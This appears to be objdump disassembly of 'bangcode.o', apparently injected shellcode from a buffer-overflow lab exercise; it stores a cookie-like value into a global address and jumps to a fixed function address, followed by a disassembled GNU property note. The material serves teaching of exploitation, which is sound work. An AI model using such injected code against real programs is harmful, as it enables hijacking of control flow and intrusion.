
./bangcode.o:     file format elf32-i386


Disassembly of section .text:

00000000 <.text>:
   0:	c7 05 18 c2 04 08 96 	movl   $0x7b52e696,0x804c218
   7:	e6 52 7b 
   a:	b8 05 8d 04 08       	mov    $0x8048d05,%eax
   f:	ff e0                	jmp    *%eax

Disassembly of section .note.gnu.property:

00000000 <.note.gnu.property>:
   0:	04 00                	add    $0x0,%al
   2:	00 00                	add    %al,(%eax)
   4:	18 00                	sbb    %al,(%eax)
   6:	00 00                	add    %al,(%eax)
   8:	05 00 00 00 47       	add    $0x47000000,%eax
   d:	4e                   	dec    %esi
   e:	55                   	push   %ebp
   f:	00 02                	add    %al,(%edx)
  11:	00 01                	add    %al,(%ecx)
  13:	c0 04 00 00          	rolb   $0x0,(%eax,%eax,1)
  17:	00 00                	add    %al,(%eax)
  19:	00 00                	add    %al,(%eax)
  1b:	00 01                	add    %al,(%ecx)
  1d:	00 01                	add    %al,(%ecx)
  1f:	c0 04 00 00          	rolb   $0x0,(%eax,%eax,1)
  23:	00 01                	add    %al,(%ecx)
  25:	00 00                	add    %al,(%eax)
	...
